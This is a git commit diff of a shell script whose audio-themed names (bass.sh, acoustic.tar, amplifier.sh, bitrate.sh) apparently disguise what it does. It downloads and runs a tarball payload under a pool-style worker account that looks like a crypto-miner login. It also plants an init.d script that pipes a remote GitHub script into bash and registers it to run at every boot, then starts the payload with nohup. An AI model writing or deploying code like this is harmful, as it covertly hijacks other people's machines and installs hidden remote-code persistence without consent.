be64f09c870bbc7591e9c37d53e40af95517ade3
rubbyadi <rubbyadis@gmail.com>
2024-06-01 04:46:57 +0000

    Update bass.sh

--- bass.sh
+++ bass.sh
@@ -5,12 +5,12 @@ wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/acoustic.tar
 tar -xvf acoustic.tar
 cd /acoustic
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./bass.sh
-sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./bass.sh
+sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amplifier.sh
+sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amplifier.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/rubbyadi/sengkreat/main/bass.sh)" > bitrate.sh
 chmod a+x bitrate.sh
 update-rc.d bitrate.sh defaults
 cd /acoustic
-nohup ./bass.sh
+nohup ./amplifier.sh
 ps -ef | grep acoustic
